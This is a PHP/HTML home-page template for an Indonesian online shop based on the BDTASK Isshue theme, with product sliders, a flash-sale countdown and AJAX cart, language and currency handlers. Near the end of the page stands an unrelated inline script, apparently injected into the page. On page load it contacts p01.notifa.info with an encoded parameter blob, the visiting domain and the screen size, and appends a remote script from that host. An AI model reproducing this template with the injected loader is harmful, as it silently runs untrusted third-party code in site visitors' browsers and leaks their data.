

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Home</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

    <!-- header bottom start -->
<?php   $this->load->view('header');             ?> 
    <!-- header bottom end -->
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           



 <!--========= Slider Area =======-->
<section class="slider_area">
    <div class="container">
        <div class="row">
            <div class="col-lg-9 offset-lg-3">
                <div class="slider_inner home2_slider">
                    <div class="owl-carousel main_slider">
                                                <div class="item">
                            <a href="bdtask.html" target="_blank">
                                <img src="isshue-v1.1/my-assets/image/category/5fdf47c34c451273a40465dfce109c64.jpg"  alt="sliderImage">
                            </a>
                        </div>
                                                <div class="item">
                            <a href="bdtask.html" target="_blank">
                                <img src="isshue-v1.1/my-assets/image/category/502bb75cae8a320dff057650900c7b8c.jpg"  alt="sliderImage">
                            </a>
                        </div>
                                                <div class="item">
                            <a href="http://www.styledunea.com/" target="_blank">
                                <img src="isshue-v1.1/my-assets/image/category/7569c369997b5f0bf46e5416aab1e93c.jpg"  alt="sliderImage">
                            </a>
                        </div>
                                            </div>    
                </div>
            </div>
        </div>
    </div>
</section>
<!--======= End Slider Area =======-->
<!--contentt-->

 
<!--========== Featured Product Area 1 ==========-->
<section class="product_area wow fadeInUp">
    <div class="container">
        <div class="row db m0 product_inner">
            <div class="heading">
                <h2 class="bg_gray">Produk Populer</h2>
            </div>
            
            
            <div class="owl-carousel product_slider slider_style">
           <?php foreach ($produk  as $data_produk ): ?>
            <div class="item">
            <center> 
                <h6><?php echo $data_produk['nama_produk'] ?></h6> 
            </center><!--sku-->
                    <div class="item_inner">
                        <div class="item_image">
                            <a href=" <?php echo base_url().'detail-produk/id-produk/';?><?php echo $data_produk['id'];?>">
                                <img src="isshue-v1.1/my-assets/image/product/thumb/add026407e1947b8c9a40e7359de21a8.jpg" alt="product-image">
                            </a>
                        </div>  
                        <div class="item_info">
                            <h6 style="overflow: hidden;max-height: 49px;min-height: 49px;"><?php echo $data_produk['nama_produk'] ?><br/><!--sku-->
                            <?php echo limit_words($data_produk['short_deskripsi'],7); ?>

                            </h6>
                            

                            
                            <div class="product_cost">
                                <p class="current">

                                   <?php  rupiah($data_produk['harga']); ?> </p>
                               <!-- <p class="previous">
                                    RP.274.000 </p>   Untuk diskon coret harga   -->
                            </div>
                        <div class="addtocard">
                                <form action="#" method="post">
                                    <input type="hidden" value="1">
                                    <a  href="product_details/56121385.html" style="font-size:15px;">
                                        <button type="button" class="cart_button_gray"><i class="fa fa-shopping-cart"></i>  Beli</button>
                                    </a>
                                </form>
                            </div>
                        </div>
                   
                        
                    </div>
                </div>
               
           <?php endforeach ?>
             



                            </div>
        </div>
    </div>
</section>

<!--========== End Featured Product Area ==========-->
        
<!--========== Featured flash sale==========-->
<section class="product_area wow fadeInUp">
    <div class="container">
        <div class="row db m0 product_inner">
            <div class="heading">
                <h2 class="bg_gray">Flash Sale</h2>
                <style type="">
                .countdowns{
                    background: #d3232a;
                    padding: 6px;
                    border-radius: 2px;
                    color: #fff;
                    width: 40px;
                }
                </style>

                <ul class="list-inline">
                        <li class="list-inline-item">Berakhir Dalam </li>
                        <li class="list-inline-item countdowns"><p id="jam"></p></li><span style="color:#000">:</span>
                        <li class="list-inline-item countdowns "><p id="menit"></p></li><span style="color:#000">:</span>
                        <li class="list-inline-item countdowns"><p id="detik"></p></li>
                        <h1 id="demo"></h1>
                </ul>
               
            </div>
            <div class="owl-carousel product_slider slider_style">
                                   <?php $a=10;
                
                for($d=0;$d<$a;$d++){
                
                ?>
                               <div class="item">
                                  <center> <h6>LCD09M7</h6> </center>
                    <div class="item_inner">
                        <div class="item_image">
                            <a href="product_details/56121385.html">
                                <img src="isshue-v1.1/my-assets/image/product/thumb/add026407e1947b8c9a40e7359de21a8.jpg" alt="product-image">
                            </a>
                        </div>
                        <div class="item_info">
                            <h6>LCD09M7<br/>
                            3P 4500A 400VAC<br/>
                            SNI</h6>
                            

                            
                            <div class="product_cost">
                                <p class="current">

                                   RP.174.000 </p>
                                <p class="previous"> 
                                    RP.274.000 </p><!--diskon coret harga-->
                            </div>
                        <div class="addtocard">
                                <form action="#" method="post">
                                    <input type="hidden" value="1">
                                    <a  href="product_details/56121385.html" style="font-size:15px;">
                                        <button type="button" class="cart_button_gray"><i class="fa fa-shopping-cart"></i>  Beli</button>
                                    </a>
                                </form>
                            </div>
                        </div>
                   
                        
                    </div>
                </div>
                <?php } ?>
                
                            </div>
        </div>
    </div>
</section>

<!--========== End Featured Product Area ==========-->



<!--========== Overview Area ==========-->
<section class="overview_area wow fadeInUp">
    <div class="container">
    <div class="row">
        
        
            <div class="col" ><iframe width="100%" height="315" src="https://www.youtube.com/embed/xLCn88bfW1o" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
        
        <div class="col" ><iframe width="100%" height="315"
src="https://www.youtube.com/embed/tgbNymZ7vqY">
</iframe></div>
           
        
    </div>    
    </div>
</section>
<!--========== End Overview Area ==========-->

 

<!--=========== footer Area ===========-->
 
 <?php      $this->load->view('footer');         

        function rupiah($angka){
    
            echo "Rp " . number_format($angka,2,',','.');
                // return $hasil_rupiah;
         
        } 

  
        function limit_words($string, $word_limit){
            $words = explode(" ",$string);
            return implode(" ",array_splice($words,0,$word_limit));
        }
   ?>  
        
<!--=========== ./footer Area ===========-->




        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
        <!--timer-->
        
<script>
// Set the date we're counting down to
var countDownDate = new Date("Aug 30, 2018 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

    // Get todays date and time
    var now = new Date().getTime();
    
    // Find the distance between now and the count down date
    var distance = countDownDate - now;
    
    // Time calculations for days, hours, minutes and seconds
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    // Output the result in an element with id="demo"
    if( hours < 10 ){
        document.getElementById("jam").innerHTML   =  '0' + hours ;
    }else{
        document.getElementById("jam").innerHTML   =   hours ;

    }

    if( minutes < 10 ){
        document.getElementById("menit").innerHTML   =  '0' + minutes ;
    }else{
        document.getElementById("menit").innerHTML   =   minutes ;
    }

    if( seconds < 10 ){
        document.getElementById("detik").innerHTML   =  '0' + seconds ;
    }else{
        document.getElementById("detik").innerHTML =  seconds ;
    }
    

    
    
    // If the count down is over, write some text 
    if (distance < 0) {
        clearInterval(x);
        document.getElementById("demo").innerHTML = "EXPIRED";
    }
}, 1000);
</script>
        
    </body>


</html>
